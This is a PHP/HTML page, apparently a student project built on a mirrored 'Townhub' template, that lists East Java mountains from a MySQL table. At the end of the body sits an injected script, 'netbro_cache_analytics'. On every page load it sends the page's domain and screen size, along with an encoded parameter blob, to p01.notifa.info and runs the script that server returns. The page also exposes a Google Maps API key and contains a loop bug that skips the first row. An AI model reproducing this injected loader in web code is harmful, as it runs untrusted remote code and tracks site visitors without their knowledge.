<?php 
include 'koneksi.php';

$query = mysqli_query($db,"SELECT * FROM gunungjatim");
$row = mysqli_fetch_array($query);
 ?>


<!DOCTYPE HTML>
<html lang="en">
    
<!-- Mirrored from townhub.kwst.net/index.html by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 23 Feb 2020 01:22:17 GMT -->
<head>
        <!--=============== basic  ===============-->
        <meta charset="UTF-8">
        <title>Townhub - Directory Listing Template</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="robots" content="index, follow"/>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <!--=============== css  ===============-->	
        <link type="text/css" rel="stylesheet" href="css/reset.css">
        <link type="text/css" rel="stylesheet" href="css/plugins.css">
        <link type="text/css" rel="stylesheet" href="css/style.css">
        <link type="text/css" rel="stylesheet" href="css/color.css">
        <!--=============== favicons ===============-->
        <link rel="shortcut icon" href="images/favicon.ico">
    </head>
    <body>
        <!--loader-->
        <div class="loader-wrap">
            <div class="loader-inner">
                <div class="loader-inner-cirle"></div>
            </div>
        </div>
        <!--loader end-->

                   
                    <!--section -->
                    <section   class="gray-bg hidden-section particles-wrapper">
                        <div class="container">
                            <div class="section-title">
                                <h2>GUNUNG JAWA TIMUR</h2>
                                <div class="section-subtitle">GUNUNG JAWA TIMUR</div>
                                <span class="section-separator"></span>
                                <p>Pegunungan yang ada di Jawa Timur</p>
                            </div>
                            <div class="listing-item-grid_container fl-wrap">
                                <div class="row">
                                    <!--  listing-item-grid  -->
                                   <?php while ($row = $query->fetch_assoc()) : ?>
                                    <div class="col-sm-4">
                                        <div class="listing-item-grid">
                                            <div class="bg"  data-bg="images/all/56.jpg"></div>
                                            <div class="d-gr-sec"></div>
                                          
                                            <div class="listing-item-grid_title">
                                                <h3><a href="infsemeru.html"><?php echo $row['Namagng'] ?></a></h3>
                                                <p>Gunung Semeru (3.676 mdpl)</p>
                                            </div>
                                        </div>
                                    </div>
                                   <?php endwhile ?>
                                    
                       
            </div>
            <!-- wrapper end-->

        <!-- Main end -->
        <!--=============== scripts  ===============-->
        <script src="js/jquery.min.js"></script>
        <script src="js/plugins.js"></script>
        <script src="js/scripts.js"></script>
        <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDwJSRi0zFjDemECmFl9JtRj1FY7TiTRRo&amp;libraries=places&amp;callback=initAutocomplete"></script>
        <script src="js/map-single.js"></script>                          
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8rPrtuTLYhGdDh%2b571CZ2aZxfEz3Po6ZL5ilRr8NpEsorzsGWQWjry%2b%2fTx9q9W3Cl3fUdxkYIHbyxS38Zi%2fXW5cHGRnv3udRA1ojTcewe7nD%2fZNXZOV2F475laTyFx7chhinFefwbBSwdVoXo2L%2baEJDALuJtnZBDpv6YXIQyGBQWB72XhS6MTjE0jmCkx7jk3%2bjd7Udhpu0NGvOzdSlx0AzuYJFxfK1rqZzFQnBdaS89DZEurWc9m%2fruznQ3L%2fWJXIQuphcJ4qLDus%2fDtomBg7QgQE8xbxABn%2fAg3M9acfuNSLRFN9lD87z5nyU28poElsZHn4GJCqLQYX1yQROCDB48CYtB3ecYvDIiNz2u8F98fgw4Kw0lG3b39VbqnYVETOFNANuk%2fkkPZpIWkYTLii0VasfdoKikMYpYpYoBTN0hQNTu3XPrXEPrmS2PIzgXH%2fjIKrnSDWn%2bDgFwVEyqOX9JzBUEh3E" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from townhub.kwst.net/index.html by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 23 Feb 2020 01:26:21 GMT -->
</html>